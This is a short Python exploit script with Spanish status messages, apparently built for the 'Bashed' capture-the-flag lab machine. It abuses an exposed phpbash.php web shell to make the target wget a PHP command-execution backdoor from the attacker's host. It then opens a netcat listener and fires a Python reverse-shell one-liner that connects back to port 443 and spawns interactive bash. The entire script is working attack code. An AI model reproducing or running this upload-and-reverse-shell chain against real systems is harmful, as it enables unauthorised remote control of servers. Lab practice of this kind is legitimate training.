#!/usr/bin/python3

import requests
import subprocess

url = 'http://10.10.10.68/dev/phpbash.php'

print("Bienvenido a la consola de la maquina Bashed\n")

print("[+] Creando PAYLOAD...\n")
subprocess.call("echo '<?php system($_REQUEST[a]); ?>' > rshell.php", shell=True)

print("[+] PAYLOAD CREADO!\n")

print("[+] Subiendo PAYLOAD...\n")
subprocess.call("python -m SimpleHTTPServer 80 &", shell=True)
comandos = {'cmd' : 'cd /var/www/html/uploads/; wget http://10.10.14.30/rshell.php'}	#MODIFIQUE SU IP
shell = requests.post(url, comandos)
r_shell = shell.text
print(r_shell)
subprocess.call("fuser -k 80/tcp", shell=True)
print("[+] PAYLOAD SUBIDO!")

print("Activando PAYLOAD...")
subprocess.call('x-terminal-emulator -e nc -lvp 443 > /dev/null 2>&1 &', shell=True)
comando = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.30",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
requests.get('http://10.10.10.68/uploads/rshell.php?a='+comando)
print("\nSHELL CREADA! GRACIAS POR USAR NUESTRO PROGRAMA!")
